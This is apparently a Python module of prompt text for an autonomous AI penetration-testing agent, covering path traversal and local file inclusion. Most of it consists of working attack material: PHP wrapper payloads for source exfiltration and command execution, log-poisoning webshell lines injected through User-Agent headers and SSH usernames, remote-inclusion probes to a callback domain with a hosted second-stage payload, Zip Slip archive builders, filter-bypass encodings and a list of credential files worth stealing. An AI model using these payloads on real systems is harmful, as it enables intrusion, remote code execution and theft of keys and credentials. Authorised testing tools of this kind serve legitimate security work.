- [ ] OBJECTIVE-DATUM LOCATION SWEEP on record. When a read or inclusion primitive
      is CONFIRMED but the objective datum (flag / secret / key / credential / config
      value) has not been located, you may NOT `switch_skill`, ask for a hint, write a
      final summary, or end the run until you have swept for it along a matrix you
      GENERATE yourself (never a fixed short list):
        - names: vary CASE (lower / UPPER / Mixed) and try common extensions AND the
          app's OWN language extension -- a datum file may itself be an interpreted
          script, not plain text;
        - directories: the current web-root and its parents, the filesystem root,
          temp / home, and any service directory the app revealed;
        - depths: several traversal depths (the correct one is target-specific).
      Probe EVERY candidate through BOTH channels: (a) a direct read/stream, AND
      (b) wherever an include/execute sink or any RCE primitive is confirmed, an
      execute-then-emit-as-data read (`readfile` / `cat` / `file_get_contents`),
      because an INTERPRETED datum file returns blank/boilerplate on direct inclusion.
      Treat a blank / "not found" / zero-length body as INCONCLUSIVE, never as
      "absent" -- re-read that same candidate through the execution channel. Prefer
      reading the location from the app's OWN source/config over blind guessing.
- [ ] "Execution channel not viable" is an INVALID verdict unless at least ONE full
      poison -> include -> read cycle was actually EXECUTED against a FRESH /
      uncorrupted sink. A sink polluted by your own prior probe lines parse-errors the
      whole include and returns blank; that is corruption to route around (use a fresh
      or different writable sink), NOT proof the channel is dead.
Only once this checklist is complete may you `switch_skill` or report the class
as not present. A 403 you never re-routed through a second handler is an open
lead, not a closed door.
"""


# =============================================================================
# PHP WRAPPERS + LOG POISONING (gated on PATH_TRAVERSAL_PHP_WRAPPERS_ENABLED)
# =============================================================================

PATH_TRAVERSAL_PHP_WRAPPERS = """
## PHP Wrappers + Log Poisoning Workflow

**Use this when:** the target is PHP-based AND plain `?file=../../etc/passwd`
is filtered, returns empty, or only echoes parsed output (no raw read).

PHP `include()` / `require()` / `file_get_contents()` accept stream wrappers
that bypass naive `..`-blocklists and let you exfiltrate source code or
trigger code execution.

---

### `php://filter` -- exfiltrate source code as base64

The single highest-yield PHP LFI primitive. Reads any file the PHP process
can access, base64-encodes it, returns it inline. Survives most WAFs because
the payload contains no `..` and the wrapper string is non-obvious.

```
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php
?file=php://filter/read=convert.base64-encode/resource=../config/database.php
```

Decode the base64 in-place via `execute_code` (Python) to read source verbatim.
Look for DB credentials, framework SECRET_KEY, hard-coded API tokens, and
included files (chase the include chain).

Stack the filter for stream chaining:

```
?file=php://filter/convert.base64-encode|convert.base64-encode/resource=index.php
```

When `convert.base64-encode` is blacklisted, try the iconv chain (PHP filter
oracle -- works even when output is not echoed):

```
?file=php://filter/convert.iconv.UTF8.UTF7|convert.base64-encode/resource=...
```

### When a fixed path PREFIX blocks wrappers -> pivot to code execution

If the app prepends a fixed prefix to your input (e.g. `include("dir/".$input)`),
a stream wrapper CANNOT sit at the START of the string, so `php://filter` / `data://`
will not fire. And simply including a PHP target then EXECUTES it rather than
revealing its source, so a file that does not echo shows you nothing. To read such a
file's CONTENT you must gain CODE EXECUTION and print it yourself:
- **Log poisoning:** inject PHP into a log the app writes (a `User-Agent` or `Referer`
  header lands in `access.log` / `error.log`), then include that log through the LFI
  so your injected code runs; have it read and echo the target file.
- Alternative poisonable sinks to include: `/proc/self/environ`, `/proc/self/fd/N`,
  PHP session files (`/tmp/sess_<id>`), or a file you uploaded via a legitimate
  endpoint.
- A single `system($_GET["c"])` that prints the target file is enough for proof; do
  not drop a persistent shell without explicit operator approval.

### `data://` -- inline payload

When `allow_url_include` is on, `data://` lets you supply the included content
inline -- excellent for one-shot RCE proofs:

```
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
?file=data://text/plain,<?php system($_GET['c']); ?>&c=id
```

The first form base64-decodes to `<?php phpinfo(); ?>` -- harmless oracle.
Only escalate to the second form if `RCE_AGGRESSIVE_PAYLOADS` is true on the
RCE skill (this prompt does NOT enable persistent shells).

### `expect://` -- direct command execution

When the `expect` PHP extension is loaded (rare on hardened hosts):

```
?file=expect://id
?file=expect://uname%20-a
```

Stop at `id` / `uname -a` for the proof. No further commands without explicit
operator escalation.

### `zip://` -- include a file inside a ZIP

Useful when the application accepts a ZIP upload AND has an LFI elsewhere:

1. Upload a ZIP containing `payload.php` via the legitimate upload endpoint.
2. Note the on-disk path (often `/uploads/<hash>.zip`).
3. Trigger inclusion of the ZIP entry: `?file=zip:///uploads/<hash>.zip%23payload.php`.

The `%23` is a URL-encoded `#` -- the wrapper uses `#` to denote an entry
inside the archive.

### `phar://` -- deserialisation-via-LFI (legacy PHP, still found)

When the target is PHP <8.0 with no `--disable-functions` hardening, a `phar`
archive crafted with metadata can trigger object deserialisation just by being
included via `phar://`. Out of scope for the path-traversal skill -- if you
detect this primitive, the RCE skill (`rce`) owns it via deserialization.

### Log poisoning -- inject a payload, then include the log

When the target is PHP AND you have LFI but `allow_url_include` is OFF (no
`data://`, no remote inclusion), poison a log file with a PHP payload, then
include the log:

**POISON HYGIENE -- read before your first request; this is where most log-poison
attempts silently die.** An append-only log CANNOT be un-corrupted. The FIRST malformed
PHP line you write to it -- most often a double quote the logger escapes to `\"`, which
turns your string literal into a parse error -- makes `include()` fail to compile the
WHOLE file, so that log returns BLANK on every later include and no clean payload can
ever fire again. Therefore:
- **Zero-quote payload, always.** Use a payload containing NO double AND NO single quotes,
  so nothing the logger escapes can break it: `<?php system($_GET[c]);?>` or
  `<?=system($_GET[c])?>` (an unquoted `$_GET[c]` key is fine); pass the command as `&c=id`.
  Avoid `echo "..."`, `'...'`, and nested-shell quoting entirely.
- **Poison ONCE per log.** Do not spray several payloads into the same log "to be sure" --
  every extra line is another chance to corrupt it.
- **Blank include AFTER a clean poison == already-corrupted log, NOT wrong depth.** If the
  include returns empty once you KNOW the path resolves (you read `/etc/passwd` at the same
  depth), an earlier bad line has poisoned it. Do NOT keep re-poisoning or re-guessing depth
  on that file: pivot to a DIFFERENT sink you have not corrupted -- a fresh `error.log` (send
  a request that errors with the payload in the path), a PHP session file you control (store
  the payload via a form field), or an uploaded file -- and include THAT.

1. Identify a readable log: `?file=../../../../var/log/apache2/access.log`,
   `?file=../../../../var/log/nginx/access.log`,
   `?file=../../../../var/log/auth.log`,
   `?file=../../../../var/log/mail.log`,
   `?file=../../../../proc/self/fd/N` (numbered fd, brute the index).
   **Do NOT let the advertised `Server:` header pick the log path for you.** A PHP
   app (`X-Powered-By: PHP`, `.php` endpoints) frequently sits behind a reverse
   proxy that rewrites `Server:` to its own (e.g. `nginx`/`cloudflare`), so the real
   log is the *backend's* -- sweep BOTH `apache2/*` and `nginx/*` (and `php*-fpm`)
   paths regardless of what the banner claims, rather than concluding "no log here".
2. Inject the payload via the channel that writes to that log:
   - Apache / nginx access log: send a request with a crafted `User-Agent`
     header: `User-Agent: <?php system($_GET['c']); ?>`.
   - Auth log: connect via SSH with the username `<?php system($_GET['c']); ?>`
     -- the failed-login line carries the payload.
   - Mail log: send a mail with the crafted subject.
3. Trigger inclusion: `?file=../../../../var/log/apache2/access.log&c=id`.
4. Read the response for the command output.
5. **Payload hygiene (why a "correct" poison silently returns nothing):**
   - **Quote-escaping.** Access-log formats ESCAPE double-quotes in the logged field
     (Apache stores a `"` as `\"`), so PHP that relies on double-quoted string literals
     is written malformed and fatals on include. Use single-quoted or quote-free PHP
     (e.g. `<?php system($_GET[c]); ?>`), and generate it with a real HTTP client, not
     nested shell quoting that can mangle it before it is sent.
   - **All-or-nothing compile.** `include()` compiles the ENTIRE log in one pass; a
     single earlier line holding a broken `<?php ... ?>` fragment is a parse error that
     blanks the whole response, hiding a valid payload later in the file. Keep injected
     PHP minimal and syntactically complete; if the response goes empty right after your
     probes, assume you poisoned the log with a malformed line and switch channel
     (`/proc/self/environ`, a session file, a fresh log) rather than re-firing.
   - A **blank / zero-length** response from including a file is itself a signal that the
     file was interpreted (or failed to compile), NOT that it is absent -- when a target
     file executes instead of rendering, read its bytes as DATA through your RCE
     (`readfile`/`cat`/`file_get_contents`), never by including it directly.

Log poisoning is a Level-4 critical-impact primitive -- it gives RCE under the
web user. Treat it as a path-traversal-to-RCE chain and stop at one
proof-of-concept (`id`, `whoami`); pivot to the RCE skill for any further
exploitation.

### Session / upload temp file inclusion

When logs are unreachable, poison a PHP session file or a temp upload:

- Session: `?file=../../../../var/lib/php/sessions/sess_<PHPSESSID>` (set the
  payload as a session variable via a registration / profile form).
- Upload temp: `?file=../../../../tmp/php<XXXXXX>` (race the temp filename
  during a multipart POST -- noisy, low success rate).

### Caches and `.env`

PHP frameworks often expose readable caches with secrets baked in:

```
?file=../../../../var/www/html/storage/framework/cache/data/<key>     # Laravel
?file=../../../../var/www/html/bootstrap/cache/config.php              # Laravel cached config
?file=../../../../var/www/html/var/cache/prod/srcApp_KernelProdContainer.php  # Symfony
?file=../../../../var/www/html/.env                                    # any framework
```
"""


# =============================================================================
# OOB / RFI WORKFLOW (gated on PATH_TRAVERSAL_OOB_CALLBACK_ENABLED)
# =============================================================================

PATH_TRAVERSAL_OOB_WORKFLOW = """
## OOB / RFI Workflow (interactsh DNS+HTTP oracle)

**Use this when:** the response body never reflects file content (true blind),
the target may follow remote includes, or you want a near-zero-noise RFI
oracle. Requires `interactsh-client` (already in kali_shell) and the project
setting `OOB callback`=True.

---

### Step 1: Start interactsh-client as a background process

```
kali_shell({"command": "interactsh-client -server OOB_PROVIDER -json -v > /tmp/interactsh.log 2>&1 & echo $!"})
```

Replace `OOB_PROVIDER` with the configured value from the settings block.
**Save the PID** for later cleanup.

### Step 2: Read the registered callback domain

```
kali_shell({"command": "sleep 5 && head -20 /tmp/interactsh.log"})
```

Look for the `.OOB_PROVIDER` domain (e.g. `abc123xyz.oast.fun`). This is your
**REGISTERED_DOMAIN**. It is cryptographically tied to the running client --
random subdomains will NOT route back.

### Step 3: RFI probe

If `allow_url_include` is on (PHP) or the language allows remote stream
handlers, a clean URL inclusion fires the OOB:

```
?file=http://REGISTERED_DOMAIN/probe.txt
?file=https://REGISTERED_DOMAIN/probe.txt
?file=//REGISTERED_DOMAIN/probe.txt                       # protocol-relative; sometimes bypasses scheme allowlists
?file=ftp://REGISTERED_DOMAIN/probe.txt                   # alternative protocol
```

Per-language stream handlers worth probing when the basic forms fail:

```
?file=php://stream/http/REGISTERED_DOMAIN/probe.txt       # PHP stream wrapper
?file=jar:http://REGISTERED_DOMAIN/x.jar!/payload.class   # Java JarURLConnection
?file=netdoc://REGISTERED_DOMAIN/                         # Java netdoc protocol (legacy)
```

A successful HTTP callback to interactsh proves the sink fetches remote URLs
(Level 1 RFI). To prove execution rather than just fetch, host an actual
payload and observe a second-stage callback from the executed code:

```
kali_shell({"command": "echo '<?php file_get_contents(\\"http://REGISTERED_DOMAIN/exec.txt\\"); ?>' > /tmp/payload.php"})
kali_shell({"command": "python3 -m http.server 8000 --directory /tmp & echo $!"})
# expose the server via chisel/ngrok if behind NAT, then point the RFI at it.
# If the target shares a network with you (isolated lab / internal engagement),
# skip the tunnel entirely: serve on your shared-network IP and point the RFI
# straight at http://<your-shared-ip>:8000/ -- see Step 4C Mode 1 (no OOB needed).
```

A `/exec.txt` HTTP callback in the interactsh log = remote code executed
(Level 4 critical-impact RFI).

### Step 4: Blind LFI oracle (no RFI required)

When RFI is blocked but the application has LFI, blind oracle via DNS-only
exfil works for any wrapper that reaches the network. Most reliable: a
`xinclude`-style wrapper or a `<!ENTITY>` if the file ends up inside an XML
parser:

```
?file=php://filter/convert.iconv.UTF8.UTF7/resource=//REGISTERED_DOMAIN/x
```

If the response stays uniform but a DNS query for `REGISTERED_DOMAIN` hits
the interactsh log, the wrapper resolved -- weak but useful Level 1.

### Step 5: Cleanup

```
kali_shell({"command": "kill SAVED_PID 2>/dev/null"})
kali_shell({"command": "rm -f /tmp/interactsh.log /tmp/payload.php"})
```
"""


# =============================================================================
# ARCHIVE EXTRACTION / ZIP SLIP (gated on PATH_TRAVERSAL_ARCHIVE_EXTRACTION_ENABLED)
# =============================================================================

PATH_TRAVERSAL_ARCHIVE_EXTRACTION = """
## Archive Extraction Workflow (Zip Slip)

**Use this when:** the target accepts an archive (ZIP / TAR / TGZ / 7z) for
plugin import, theme upload, backup restore, or report ingest, AND project
setting `Archive-extraction` is True. This primitive WRITES files outside the
extraction directory; it is gated strictly because of the side effect.

---

### Step 1: Identify the extractor surface

Hunt for archive-accepting endpoints in recon:

```cypher
MATCH (e:Endpoint) WHERE e.url CONTAINS '<target_host>' AND (e.url =~ '(?i).*(import|backup|restore|plugin|theme|upload|migration|export).*') RETURN e.url, e.method
```

Common patterns:
- WordPress / Drupal plugin or theme upload (`/wp-admin/plugin-install.php`,
  `/admin/modules/install`)
- CI/CD artefact upload (`/ci/upload`, `/builds/*/artifacts`)
- Backup-restore admin panels
- Report/document ingest pipelines

### Step 2: Craft a Zip Slip archive

Use `execute_code` to build a ZIP whose entries escape the extraction
directory. The marker file should land in a path the agent can later read
back via the path-traversal primitive established in Step 4 of the main
workflow:

```python
# language: python
import zipfile

MARKER = '../../../../tmp/redamon_zipslip_proof.txt'
content = b'REDAMON_ZIPSLIP_OK\\n'

with zipfile.ZipFile('/tmp/zipslip.zip', 'w', zipfile.ZIP_STORED) as z:
    # Benign filler so the archive opens cleanly in a viewer
    z.writestr('readme.txt', 'placeholder')
    # Escape entry. python zipfile keeps the literal name on disk.
    z.writestr(MARKER, content)

print('built /tmp/zipslip.zip')
```

For TAR / TGZ:

```python
# language: python
import io, tarfile

buf = io.BytesIO(b'REDAMON_TARSLIP_OK\\n')
ti = tarfile.TarInfo('../../../../tmp/redamon_tarslip_proof.txt')
ti.size = len(buf.getvalue())

with tarfile.open('/tmp/tarslip.tar', 'w') as t:
    placeholder = tarfile.TarInfo('readme.txt')
    placeholder.size = 0
    t.addfile(placeholder, io.BytesIO(b''))
    t.addfile(ti, buf)

print('built /tmp/tarslip.tar')
```

### Step 3: Upload and trigger extraction

```
execute_curl({"args": "-s -X POST -F 'archive=@/tmp/zipslip.zip' http://TARGET/admin/import"})
```

The exact field name (`archive`, `file`, `upload`, `plugin`) and any required
CSRF token come from Step 1 reconnaissance. Use `execute_playwright` if the
upload is gated by a multi-step UI flow.

### Step 4: Verify the marker landed outside the destination

If you have an existing path-traversal sink, read it back:

```
?file=../../../../tmp/redamon_zipslip_proof.txt
```

If the response body contains `REDAMON_ZIPSLIP_OK`, the extractor wrote
outside the destination directory -- Zip Slip confirmed.

If you do NOT have a path-traversal read sink to verify, look for indirect
signals: a 500 from the extractor mentioning the bogus path, or a downstream
endpoint that ends up reading from the polluted location.

### Step 5: Cleanup obligation (MANDATORY)

You wrote a file to the target filesystem. Remove it before finishing:

- If your traversal sink supports `DELETE` (rare) -- use it.
- Otherwise, document the exact path and content in the final report so the
  remediation team can clean up. Do NOT leave executable / persistent payloads
  behind. The marker MUST be a benign text file with a recognisable token.

### Variations

- Symlink-in-archive: a TAR with a symlink entry pointing to a sensitive path
  can hand the extractor a write-anywhere primitive even when path normalisation
  blocks `../`. Test by adding `tarfile.SYMTYPE` entries.
- Absolute-path entries: some extractors ignore leading `/`; some honour it.
  Add `/etc/redamon_check` entries alongside the `../` form to cover both.
- 7z / RAR: the archive format matters when the backend uses a specific
  extractor library; if ZIP fails, retry with TGZ and 7z.
"""


# =============================================================================
# PAYLOAD REFERENCE (gated on PATH_TRAVERSAL_PAYLOAD_REFERENCE_ENABLED)
# =============================================================================

PATH_TRAVERSAL_PAYLOAD_REFERENCE = """
## Path Traversal Payload Reference

Look up by bypass class identified in Step 4. Always test the simplest payload
first; only escalate complexity if the simple one is filtered.

### Encoding variants (single, double, mixed, unicode)

| Form | Example | Use when |
|------|---------|----------|
| Plain | `../../etc/hosts` | Baseline |
| Single URL | `..%2f..%2fetc%2fhosts` | `..` literal blocked |
| Single URL (dots) | `%2e%2e%2f%2e%2e%2fetc%2fhosts` | Dot literal blocked |
| Double URL | `..%252f..%252fetc%252fhosts` | Single-decode WAF in front of double-decode app |
| Mixed sep | `..\\..\\..\\etc\\hosts` | Windows + cross-platform parsers |
| Backslash encoded | `..%5c..%5cetc%5chosts` | Encoded backslash variant |
| UTF-8 overlong | `..%c0%2f..%c0%2fetc%c0%2fhosts` | Legacy Unicode-aware filters |
| Unicode dot | `\\u002e\\u002e\\u002fetc\\u002fhosts` | JS/JSON sink contexts |
| Fullwidth | `..\uff0f..\uff0fetc\uff0fhosts` | Naive ASCII filter |

### Dot tricks

```
....//                                # double-dot fold (Tomcat / nginx)
..../                                 # extra-dot fold
././                                  # current-dir noop pad
..\\.\\..\\.\\                        # Windows mixed
..\\\\..\\\\                          # double backslash (collapses on some parsers)
.../                                  # trailing extra dot
..../../                              # quadruple dot escape
```

### Trailing tricks

```
../../etc/hosts%00                     # null-byte truncation (legacy PHP < 5.3.4)
../../etc/hosts%23                     # fragment marker truncation
../../etc/hosts.png                    # extension append (when sink enforces ext)
../../etc/hosts;.png                   # parameter strip
../../etc/hosts?foo                    # query strip
```

### Absolute-path acceptance

```
/etc/hosts                            # Unix
file:///etc/hosts                     # file:// scheme
C:\\Windows\\win.ini                   # Windows
\\\\.\\C:\\Windows\\win.ini             # UNC-style local
\\\\?\\C:\\Windows\\win.ini             # UNC long-path prefix (Windows)
\\\\<HOST>\\share\\file                # UNC remote (RCE-by-SMB-auth-relay candidate)
```

### Server / parser mismatch (proxy + backend)

```
/static/..;/../etc/hosts               # ;jsessionid-style param confuses proxy normalisation
/static/%2e%2e%2fetc%2fhosts           # encoded slash decoded by backend, not by proxy
/static/..%252f..%252fetc%252fhosts    # double-decode chain
/static/.%252e/etc/hosts               # mixed encoding
/static/..%c0%afetc/hosts              # invalid UTF-8 sequence as separator
//target.example.com/etc/hosts        # double-slash starts a new authority on some parsers
```

### Wrapper quick-look (PHP)

```
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.iconv.UTF8.UTF7|convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=secret.txt
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
expect://id
zip:///uploads/<hash>.zip%23payload.php
```

### High-value targets (cheat sheet)

| Path | Why it matters |
|------|----------------|
| `/etc/hosts` | Tiny canonical proof, low noise |
| `/etc/passwd` | UIDs, shells, app users |
| `/etc/shadow` | Root-only. A 403/empty here is USUALLY a WAF/proxy block of the payload string or a handler ACL, NOT proof of LFI -- confirm the read primitive with a world-readable root file (`/etc/passwd`, `/etc/hostname`) before claiming a finding |
| `/proc/self/environ` | Env vars, often leaks SECRETS / DB_URL / API keys |
| `/proc/self/cmdline` | Exact binary path, build args |
| `/proc/self/cgroup` | Container fingerprint |
| `/var/run/secrets/kubernetes.io/serviceaccount/token` | k8s service-account JWT |
| `/var/log/apache2/access.log`, `/var/log/nginx/access.log` | Log-poisoning candidates |
| `/var/www/html/.env` | Framework env + DB creds + APP_KEY |
| `/var/www/html/wp-config.php` | WordPress DB creds + AUTH_KEYS |
| `/home/<user>/.ssh/id_rsa` | SSH private key |
| `/root/.aws/credentials` | AWS access keys |
| `C:\\Windows\\win.ini` | Windows canonical proof |
| `C:\\inetpub\\wwwroot\\web.config` | IIS app config + connection strings |

### Real-world precedents

| Pattern | Reference | Lesson |
|---------|-----------|--------|
| CVE-2021-41773 / CVE-2021-42013 | Apache 2.4.49/50 mod_alias path traversal | Encoded slash defeated normalisation |
| CVE-2018-1273 | Spring Data Commons SpEL | Path traversal cascading into SpEL eval |
| CVE-2023-28432 | MinIO console env disclosure | Unauthenticated `/secrets` endpoint |
| CVE-2024-23897 | Jenkins arbitrary file read via CLI | `@<filepath>` command-line expansion |
| HackerOne #1146697 | nginx alias misconfig (`location /static`) | `..;` and `%2f` parser-mismatch |
| HackerOne #341876 | Slack arbitrary file read via export | Tar entry containing `../` |
| Snyk Zip Slip 2018 | 100s of libraries (Adobe, Apache, Twitter, etc.) | Library-wide extractor bug class |

When a similar pattern matches your target, cite the precedent in the finding
evidence -- it sharpens the report and helps the remediation team find a fix.
"""
